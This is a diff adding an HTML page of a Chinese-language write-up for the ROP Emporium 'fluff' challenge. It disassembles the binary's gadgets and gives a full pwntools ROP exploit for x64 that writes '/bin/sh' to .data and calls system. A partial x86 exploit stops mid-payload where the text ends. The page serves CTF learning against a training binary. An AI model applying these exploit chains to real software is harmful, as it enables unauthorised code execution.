@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>fluff &mdash; rop emporium writeup  文档</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> rop emporium writeup
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="在文档中搜索" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <!-- Local TOC -->
+              <div class="local-toc"><ul>
+<li><a class="reference internal" href="#">fluff</a><ul>
+<li><a class="reference internal" href="#working-backwards">Working backwards</a></li>
+<li><a class="reference internal" href="#do-it">Do it!</a></li>
+<li><a class="reference internal" href="#x64">x64</a></li>
+<li><a class="reference internal" href="#x86">x86</a></li>
+</ul>
+</li>
+</ul>
+</div>
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">rop emporium writeup</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li>fluff</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/5_fluff/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="fluff">
+<h1>fluff<a class="headerlink" href="#fluff" title="永久链接至标题"></a></h1>
+<p>via：https://ropemporium.com/challenge/fluff.html</p>
+<p>The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done. If we take the time to consider a different approach we’ll succeed.
+Click below to download the binary.</p>
+<p><a class="reference external" href="https://ropemporium.com/binary/fluff.zip">64bit</a> <a class="reference external" href="https://ropemporium.com/binary/fluff32.zip">32bit</a></p>
+<section id="working-backwards">
+<h2>Working backwards<a class="headerlink" href="#working-backwards" title="永久链接至标题"></a></h2>
+<p>Once we’ve employed our usual drills of checking protections and searching for interesting symbols and strings we can think about what we’re trying to acheive and plan our chain. A solid approach is to work backwards; we’ll need a mov [reg], reg or something equivalent to make the actual write so we can start there.</p>
+</section>
+<section id="do-it">
+<h2>Do it!<a class="headerlink" href="#do-it" title="永久链接至标题"></a></h2>
+<p>There’s not much more to this challenge, we just have to think about ways to move data into the registers we want to control. Sometimes we’ll need to take an indirect approach, especially in smaller binaries with fewer available gadgets like this one. Once you’ve got a working write primitive go ahead and craft your solution. If you don’t feel like doing the hard work note that the 64 bit version of this challenge can also be pwned using the same single link chain that works on write4 🤦‍♂️</p>
+</section>
+<section id="x64">
+<h2>x64<a class="headerlink" href="#x64" title="永久链接至标题"></a></h2>
+<p><img alt="image-20200503034541636" src="../_images/image-20200503034541636.png" /></p>
+<p>可以看到漏洞点这里</p>
+<p>填充长度：<code class="docutils literal notranslate"><span class="pre">0x20</span> <span class="pre">+</span> <span class="pre">0x8</span></code></p>
+<p><img alt="image-20200503034832940" src="../_images/image-20200503034832940.png" /></p>
+<p>程序开了 <code class="docutils literal notranslate"><span class="pre">NX</span></code> 也就是栈不可执行，不能像前面一样直接使用 <code class="docutils literal notranslate"><span class="pre">shellcode</span></code> 然后<code class="docutils literal notranslate"><span class="pre">call</span> <span class="pre">rax</span></code></p>
+<p><code class="docutils literal notranslate"><span class="pre">ROPgadget</span></code> 瞎逛一下</p>
+<p><img alt="image-20200503035214952" src="../_images/image-20200503035214952.png" /></p>
+<p><img alt="image-20200503035434160" src="../_images/image-20200503035434160.png" /></p>
+<p>没有拿 <code class="docutils literal notranslate"><span class="pre">shell</span></code> 和拿 f<code class="docutils literal notranslate"><span class="pre">lag</span></code> 的字符串</p>
+<p>现在有两条路可以走</p>
+<ul class="simple">
+<li><p>ret2libc，使用 puts 泄露出 某个已经被 call 过的函数的 got 表上的地址，从而得到 libc 的基地址，然后用这个基地址加上 sh 在 libc 里的偏移得到 sh 的地址，然后调用 system 拿到 shell</p></li>
+<li><p>找 gadget 把 sh 写到内存里去，然后调用 system 拿到 shell</p></li>
+</ul>
+<p>官方的意思是让我们用第二种方法</p>
+<p>找一下有没有适合的 gadget</p>
+<p>主要目的是写内存</p>
+<p>我很奇怪，回到 ghidra 看看是不是有后门</p>
+<p><img alt="image-20200503155929007" src="../_images/image-20200503155929007.png" /></p>
+<p>？？？？？？我昨晚 4 点怕是瞎了，有一个 <code class="docutils literal notranslate"><span class="pre">questionableGadgets()</span></code></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
+                    *                 FUNCTION                 *
+                    ********************************************
+                    undefined questionableGadgets()
+         undefined    AL:1      &lt;RETURN&gt;
+                    questionableGadgets               XREF[1]: Entry Point(*)  
+   00400820 41 5f      POP     R15
+   00400822 4d 31 db   XOR     R11,R11
+   00400825 41 5e      POP     R14
+   00400827 bf 50      MOV     EDI,data_start
+            10 60 00
+   0040082c c3         RET
+   0040082d 41         ??      41h    A
+   0040082e 5e         ??      5Eh    ^
+   0040082f 4d         ??      4Dh    M
+   00400830 31         ??      31h    1
+   00400831 e3         ??      E3h
+   00400832 41         ??      41h    A
+   00400833 5c         ??      5Ch    \
+   00400834 41         ??      41h    A
+   00400835 bd         ??      BDh
+   00400836 60         ??      60h    `
+   00400837 40         ??      40h    @
+   00400838 60         ??      60h    `
+   00400839 00         ??      00h
+   0040083a c3         ??      C3h
+   0040083b bf         ??      BFh
+   0040083c 50         ??      50h    P
+   0040083d 10         ??      10h
+   0040083e 60         ??      60h    `
+   0040083f 00         ??      00h
+   00400840 4d         ??      4Dh    M
+   00400841 87         ??      87h
+   00400842 d3         ??      D3h
+   00400843 41         ??      41h    A
+   00400844 5f         ??      5Fh    _
+   00400845 41         ??      41h    A
+   00400846 bb         ??      BBh
+   00400847 50         ??      50h    P
+   00400848 20         ??      20h     
+   00400849 60         ??      60h    `
+   0040084a 00         ??      00h
+   0040084b c3         ??      C3h
+   0040084c 41         ??      41h    A
+   0040084d 5f         ??      5Fh    _
+   0040084e 4d         ??      4Dh    M
+   0040084f 89         ??      89h
+   00400850 1a         ??      1Ah
+   00400851 41         ??      41h    A
+   00400852 5d         ??      5Dh    ]
+   00400853 41         ??      41h    A
+   00400854 5c         ??      5Ch    \
+   00400855 45         ??      45h    E
+   00400856 30         ??      30h    0
+   00400857 22         ??      22h    &quot;
+   00400858 c3         ??      C3h
+   00400859 0f         ??      0Fh
+   0040085a 1f         ??      1Fh
+   0040085b 80         ??      80h
+   0040085c 00         ??      00h
+   0040085d 00         ??      00h
+   0040085e 00         ??      00h
+   0040085f 00         ??      00h
+</pre></div>
+</div>
+<p>后面这些反编译器遇到 ret 后直接不反编译了，手动反编译看看</p>
+<p>反正 ghidra 下，选中，按 d 就可以</p>
+<p>是这样的：</p>
+<p><img alt="image-20200503161826911" src="../_images/image-20200503161826911.png" /></p>
+<p>其实这个算半个后门</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
+                    *                 FUNCTION                 *
+                    ********************************************
+                    undefined questionableGadgets()
+         undefined    AL:1      &lt;RETURN&gt;
+                    questionableGadgets               XREF[1]: Entry Point(*)  
+   00400820 41 5f      POP     R15
+   00400822 4d 31 db   XOR     R11,R11
+   00400825 41 5e      POP     R14
+   00400827 bf 50      MOV     EDI,data_start
+            10 60 00
+   0040082c c3         RET
+   0040082d 41 5e      POP     R14
+   0040082f 4d 31 e3   XOR     R11,R12
+   00400832 41 5c      POP     R12
+   00400834 41 bd      MOV     R13D,0x604060
+            60 40 
+            60 00
+   0040083a c3         RET
+   0040083b bf 50      MOV     EDI,data_start
+            10 60 00
+   00400840 4d 87 d3   XCHG    R11,R10
+   00400843 41 5f      POP     R15
+   00400845 41 bb      MOV     R11D,_ITM_registerTMCloneTable    = ??
+            50 20 
+            60 00
+   0040084b c3         RET
+   0040084c 41 5f      POP     R15
+   0040084e 4d 89 1a   MOV     qword ptr [R10],R11
+   00400851 41 5d      POP     R13
+   00400853 41 5c      POP     R12
+   00400855 45 30 22   XOR     byte ptr [R10],R12B
+   00400858 c3         RET
+   00400859 0f 1f      NOP     dword ptr [RAX]
+            80 00 
+            00 00 00
+</pre></div>
+</div>
+<p>抽取需要的 gadget：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   ;这里可以给 R12 赋值，这个最终会进入 R10（0x00400832 -&gt; 0x0040082f -&gt; 0x00400840）
+   00400832 41 5c      POP     R12
+   00400834 41 bd      MOV     R13D,0x604060
+            60 40 
+            60 00
+   0040083a c3         RET
+   
+   ; xor 置 0 R11 ，因为如果 R11 不是 0 后面会影响到（0x0040082f）
+   00400822 4d 31 db   XOR     R11,R11
+   00400825 41 5e      POP     R14
+   00400827 bf 50      MOV     EDI,data_start
+            10 60 00
+   0040082c c3         RET
+   
+   0040082f 4d 31 e3   XOR     R11,R12
+   00400832 41 5c      POP     R12
+   00400834 41 bd      MOV     R13D,0x604060
+            60 40 
+            60 00
+   0040083a c3         RET 
+   
+   ; XCHG指令，双操作数指令，用于交换 src 和 dest 操作数的内容。其中， src 和 dest 可以是两个通用寄存器，也可以是一个寄存器和一个 memory 位置。
+   ; 其实这一步是为 0x0040084e 写内存做铺垫，当 R11 存的是一个地址时，在 0x0040084e 就是往这个地址写
+   00400840 4d 87 d3   XCHG    R11,R10
+   00400843 41 5f      POP     R15
+   00400845 41 bb      MOV     R11D,_ITM_registerTMCloneTable    = ??
+            50 20 
+            60 00
+   0040084b c3         RET
+   
+   00400822 4d 31 db   XOR     R11,R11
+   00400825 41 5e      POP     R14
+   00400827 bf 50      MOV     EDI,data_start
+            10 60 00
+   0040082c c3         RET
+   
+   0040082f 4d 31 e3   XOR     R11,R12
+   00400832 41 5c      POP     R12
+   00400834 41 bd      MOV     R13D,0x604060
+            60 40 
+            60 00
+   0040083a c3         RET 
+   
+   ; 写内存
+   0040084e 4d 89 1a   MOV     qword ptr [R10],R11
+   00400851 41 5d      POP     R13
+   00400853 41 5c      POP     R12
+   00400855 45 30 22   XOR     byte ptr [R10],R12B
+   00400858 c3         RET
+</pre></div>
+</div>
+<p>我们需要把 <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> 字符串 写进 data 段，因为在 <code class="docutils literal notranslate"><span class="pre">0x00400827</span></code>  把 data 段的地址放进了 edi 然后一直到我们的 rop 链结束都没有改变过，这样，只要 <code class="docutils literal notranslate"><span class="pre">/bin/sh</span></code> 的地址一直存在 edi 里面，在调用 system 的时候就不用 pop rdi 了。</p>
+<p>有点乱，仔细看吧，写 payload ：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/bin/env python2</span>
+<span class="c1">#! _*_ coding=utf-8 _*_</span>
+
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">fluff</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./fluff&quot;</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fluff&quot;</span><span class="p">)</span>
+
+
+<span class="n">bin_sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh</span><span class="se">\x00</span><span class="s2">&quot;</span>
+<span class="n">system_plt</span> <span class="o">=</span> <span class="n">fluff</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">]</span>
+<span class="n">pop_r12_ret</span> <span class="o">=</span> <span class="mh">0x400832</span>
+<span class="n">pop_r14_ret</span> <span class="o">=</span> <span class="mh">0x400822</span>
+<span class="n">xor_r11_r12_pop_r12_ret</span> <span class="o">=</span> <span class="mh">0x0040082f</span> 
+<span class="n">pop_r15_ret</span> <span class="o">=</span> <span class="mh">0x00400840</span>
+<span class="n">pop_r13_pop_r12_ret</span> <span class="o">=</span> <span class="mh">0x0040084e</span>
+<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x601050</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r12_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">r12 = data_section</span>
+<span class="sd">r13 = 0x604060</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">r11 = r11 ^ r11</span>
+<span class="sd">r14 = &quot;AAAAAAAA&quot;</span>
+<span class="sd">edi = data_start (data_section == data_section)</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xor_r11_r12_pop_r12_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">bin_sh</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">r11 = r11 ^ r12 (r11 == 0, r12 == data_section, 所以 r11 = data_section)</span>
+<span class="sd">r12 = &quot;/bin/sh\x00&quot;</span>
+<span class="sd">r13 = 0x604060</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r15_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">xchg r11,r10 (交换 r11 和 r10 的值)</span>
+<span class="sd">r15 = &quot;AAAAAAAA&quot;</span>
+<span class="sd">r11 = _ITM_registerTMCloneTable</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r14_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">r11 = r11 ^ r11 (r11 = 0)</span>
+<span class="sd">r14 = &quot;AAAAAAAA&quot;</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">xor_r11_r12_pop_r12_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">r11 = r11 ^ r12 (r11 = r12)</span>
+<span class="sd">r12 = &quot;AAAAAAAA&quot;</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_r13_pop_r12_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">8</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">*(r10) = r11 (往 r10 存的地址上写入 r11, 其实 r11 就是 /bin/sh\x00, r10 存的是 data_section)</span>
+<span class="sd">相当于往 data_section 写入 /bin/sh\x00</span>
+<span class="sd">r13 = &quot;AAAAAAAA&quot;</span>
+<span class="sd">r12 = &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span>
+<span class="sd">*(r10) = *(r10) ^ r12 (那个 r12B 就是取 r12 的一个 Bytes，为了防止这个破坏 *(r10) ,前一步把 r12 置 \x00, 任何字符异或 \x00  都得到它本身)</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system_plt</span><span class="p">)</span>
+<span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">call system</span>
+<span class="sd">参数就是 data_section</span>
+<span class="sd">上面已经把 data_section 复制给 edi</span>
+<span class="sd">&#39;&#39;&#39;</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>完整的汇编是这样的：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0x400804 &lt;pwnme+79&gt;                  nop    
+   0x400805 &lt;pwnme+80&gt;                  leave  
+   0x400806 &lt;pwnme+81&gt;                  ret    
+    ↓
+   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
+   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
+   0x40083a &lt;questionableGadgets+26&gt;    ret    
+    ↓
+   0x400822 &lt;questionableGadgets+2&gt;     xor    r11, r11
+   0x400825 &lt;questionableGadgets+5&gt;     pop    r14
+   0x400827 &lt;questionableGadgets+7&gt;     mov    edi, data_start &lt;0x601050&gt;
+   0x40082c &lt;questionableGadgets+12&gt;    ret    
+    ↓
+   0x40082f &lt;questionableGadgets+15&gt;    xor    r11, r12
+   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
+   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
+   0x40083a &lt;questionableGadgets+26&gt;    ret    
+    ↓
+   0x400822 &lt;questionableGadgets+2&gt;     xor    r11, r11
+   0x400825 &lt;questionableGadgets+5&gt;     pop    r14
+   0x400827 &lt;questionableGadgets+7&gt;     mov    edi, data_start &lt;0x601050&gt;
+   0x40082c &lt;questionableGadgets+12&gt;    ret    
+    ↓
+   0x40082f &lt;questionableGadgets+15&gt;    xor    r11, r12
+   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
+   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
+   0x40083a &lt;questionableGadgets+26&gt;    ret    
+    ↓
+   0x400840 &lt;questionableGadgets+32&gt;    xchg   r11, r10
+   0x400843 &lt;questionableGadgets+35&gt;    pop    r15
+   0x400845 &lt;questionableGadgets+37&gt;    mov    r11d, 0x602050
+   0x40084b &lt;questionableGadgets+43&gt;    ret    
+    ↓
+   0x400822 &lt;questionableGadgets+2&gt;     xor    r11, r11
+   0x400825 &lt;questionableGadgets+5&gt;     pop    r14
+   0x400827 &lt;questionableGadgets+7&gt;     mov    edi, data_start &lt;0x601050&gt;
+   0x40082c &lt;questionableGadgets+12&gt;    ret    
+    ↓
+   0x40082f &lt;questionableGadgets+15&gt;    xor    r11, r12
+   0x400832 &lt;questionableGadgets+18&gt;    pop    r12
+   0x400834 &lt;questionableGadgets+20&gt;    mov    r13d, 0x604060
+   0x40083a &lt;questionableGadgets+26&gt;    ret    
+    ↓
+   0x40084e &lt;questionableGadgets+46&gt;    mov    qword ptr [r10], r11
+   0x400851 &lt;questionableGadgets+49&gt;    pop    r13
+   0x400853 &lt;questionableGadgets+51&gt;    pop    r12
+   0x400855 &lt;questionableGadgets+53&gt;    xor    byte ptr [r10], r12b &lt;0x601050&gt;
+   0x400858 &lt;questionableGadgets+56&gt;    ret    
+    ↓
+   0x4005e0 &lt;system@plt&gt;                jmp    qword ptr [rip + 0x200a3a] &lt;0x601020&gt;
+</pre></div>
+</div>
+<p><img alt="image-20200503175326009" src="../_images/image-20200503175326009.png" /></p>
+<p>pwn！</p>
+</section>
+<section id="x86">
+<h2>x86<a class="headerlink" href="#x86" title="永久链接至标题"></a></h2>
+<p>不多说废话，还是在 <code class="docutils literal notranslate"><span class="pre">questionableGadgets()</span></code> 函数</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>                    ********************************************
+                    *                 FUNCTION                 *
+                    ********************************************
+                    undefined questionableGadgets()
+         undefined    AL:1      &lt;RETURN&gt;
+                    questionableGadgets               XREF[1]: Entry Point(*)  
+   08048670 5f         POP     EDI
+   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+   0804867a 5e         POP     ESI
+   0804867b 31 da      XOR     EDX,EBX
+   0804867d 5d         POP     EBP
+   0804867e bf be      MOV     EDI,0xdeadbabe
+            ba ad de
+   08048683 c3         RET
+   08048684 bf ef      MOV     EDI,0xdeadbeef
+            be ad de
+   08048689 87 ca      XCHG    EDX,ECX
+   0804868b 5d         POP     EBP
+   0804868c ba d0      MOV     EDX,0xdefaced0
+            ce fa de
+   08048691 c3         RET
+   08048692 5f         POP     EDI
+   08048693 89 11      MOV     dword ptr [ECX],EDX
+   08048695 5d         POP     EBP
+   08048696 5b         POP     EBX
+   08048697 30 19      XOR     byte ptr [ECX],BL
+   08048699 c3         RET
+   0804869a 66 90      NOP
+   0804869c 66 90      NOP
+   0804869e 66 90      NOP
+</pre></div>
+</div>
+<p><img alt="image-20200503181532345" src="../_images/image-20200503181532345.png" /></p>
+<p>我们的目的是写内存，直接找到能写内存的 <code class="docutils literal notranslate"><span class="pre">gadget</span></code></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048692 5f         POP     EDI
+   08048693 89 11      MOV     dword ptr [ECX],EDX
+   08048695 5d         POP     EBP
+   08048696 5b         POP     EBX
+   08048697 30 19      XOR     byte ptr [ECX],BL
+   08048699 c3         RET
+</pre></div>
+</div>
+<p>写入 <code class="docutils literal notranslate"><span class="pre">ecx</span></code> 存的地址</p>
+<p>找，怎么给 <code class="docutils literal notranslate"><span class="pre">ecx</span></code> 赋值：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048689 87 ca      XCHG    EDX,ECX
+   0804868b 5d         POP     EBP
+   0804868c ba d0      MOV     EDX,0xdefaced0
+            ce fa de
+   08048691 c3         RET
+</pre></div>
+</div>
+<p>通过 <code class="docutils literal notranslate"><span class="pre">edx</span></code></p>
+<p>找，怎么给 <code class="docutils literal notranslate"><span class="pre">edx</span></code> 赋值：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0804867a 5e         POP     ESI
+   0804867b 31 da      XOR     EDX,EBX
+   0804867d 5d         POP     EBP
+   0804867e bf be      MOV     EDI,0xdeadbabe
+            ba ad de
+   08048683 c3         RET
+</pre></div>
+</div>
+<p>这个异或会把结果放进 <code class="docutils literal notranslate"><span class="pre">edx</span></code>，要么能找到 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">edx</span></code> 和 <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">ebx,ebx</span></code> 要么 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx</span></code> 和 <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">edx,edx</span></code></p>
+<p>有：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048670 5f         POP     EDI
+   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+</pre></div>
+</div>
+<p>ROPgadget 找一下有没有 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx;</span> <span class="pre">ret</span></code></p>
+<p><img alt="image-20200503182259756" src="../_images/image-20200503182259756.png" /></p>
+<p>有</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>0x080483e1 : pop ebx ; ret
+</pre></div>
+</div>
+<p>好了，现在能设置写入的内存地址了</p>
+<hr class="docutils" />
+<p>找一下，写字符串怎么放进去</p>
+<p>一样，逆向找：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048693 89 11      MOV     dword ptr [ECX],EDX
+</pre></div>
+</div>
+<p>需要设置 <code class="docutils literal notranslate"><span class="pre">edx</span></code></p>
+<p>没有直接 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">edx</span></code>，只能间接赋值</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   0804867b 31 da      XOR     EDX,EBX
+</pre></div>
+</div>
+<p>这个异或会把结果放进 <code class="docutils literal notranslate"><span class="pre">edx</span></code>，要么能找到 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">edx</span></code> 和 <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">ebx,ebx</span></code> 要么 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx</span></code> 和 <code class="docutils literal notranslate"><span class="pre">xor</span> <span class="pre">edx,edx</span></code></p>
+<p>发现了吗，跟设置 ecx 的某些步骤重叠了</p>
+<p>有：</p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>   08048670 5f         POP     EDI
+   08048671 31 d2      XOR     EDX,EDX
+   08048673 5e         POP     ESI
+   08048674 bd be      MOV     EBP,0xcafebabe
+            ba fe ca
+   08048679 c3         RET
+</pre></div>
+</div>
+<p>ROPgadget 找一下有没有 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">ebx;</span> <span class="pre">ret</span></code></p>
+<p><img alt="image-20200503182259756" src="../_images/image-20200503182259756.png" /></p>
+<p>漏洞点</p>
+<p><img alt="image-20200503184206069" src="../_images/image-20200503184206069.png" /></p>
+<p>填充长度：<code class="docutils literal notranslate"><span class="pre">0x28</span> <span class="pre">+</span> <span class="pre">0x4</span></code></p>
+<p>好了，可以写 payload 了：</p>
+<p>逆序看找 gadget 的步骤，只能先设置 ecx 的值，因为先设置 edx 的话我们没办法清空设置 edx 时 ecx 设置的值</p>
+<p>设置 ecx，ecx 是要设置一个可写可读的内存的起始地址</p>
+<p><img alt="image-20200503185850631" src="../_images/image-20200503185850631.png" /></p>
+<p>data 段可以，地址：<code class="docutils literal notranslate"><span class="pre">0x0804a028</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;tmux&quot;</span><span class="p">,</span> <span class="s2">&quot;split-window&quot;</span><span class="p">,</span> <span class="s2">&quot;-h&quot;</span><span class="p">]</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./fluff32&quot;</span><span class="p">)</span>
+<span class="n">data_section</span> <span class="o">=</span> <span class="mh">0x0804a028</span>
+<span class="n">pop_ebx_ret</span> <span class="o">=</span> <span class="mh">0x080483e1</span>
+<span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span> <span class="o">=</span> <span class="mh">0x08048670</span>
+<span class="n">pop_esi_xor_edx_ebx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x0804867a</span>
+<span class="n">xchg_edx_ecx_pop_ebp_ret</span> <span class="o">=</span> <span class="mh">0x08048689</span>
+<span class="n">pop_edi_write_ecx_men_pop_ebp_pop_ebx_xor_ecx_bl_ret</span> <span class="o">=</span> <span class="mh">0x08048692</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x2c</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_ebx_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">data_section</span><span class="p">)</span>
+
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pop_edi_xor_edx_edx_pop_esi_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="s2">&quot;AAAA&quot;</span>
+
